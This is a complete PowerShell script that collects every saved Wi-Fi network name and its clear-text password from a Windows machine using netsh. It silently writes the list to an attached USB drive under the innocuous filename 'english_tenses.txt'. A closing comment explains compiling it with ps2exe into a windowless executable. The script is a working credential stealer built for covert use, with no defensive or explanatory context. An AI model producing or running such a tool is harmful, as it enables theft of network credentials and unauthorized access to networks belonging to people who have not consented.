$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $_.Line.Split(":")[1].Trim()
}

$wifiCredentials = New-Object System.Text.StringBuilder
$wifiCredentials.AppendLine("SSID : PASSWORD")

foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $password = ($profileDetails | Select-String "Key Content").Line

    if ($password) {
        $password = $password.Split(":")[1].Trim()
    } else {
        $password = "No password found"
    }

    $wifiCredentials.AppendLine("$profile : $password")
}

# Identify the USB drive
$usbDrive = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } | Select-Object -First 1

if (-not $usbDrive) {
    exit
}

# Path to save the Wi-Fi credentials file
$filePath = "$($usbDrive.DeviceID)\english_tenses.txt"

# Save the Wi-Fi credentials to the file
$wifiCredentials.ToString() | Out-File -FilePath $filePath -Encoding UTF8

# to compile this file: ps2exe -noconsole -inputFile your_script.ps1 -outputFile your_script.exe
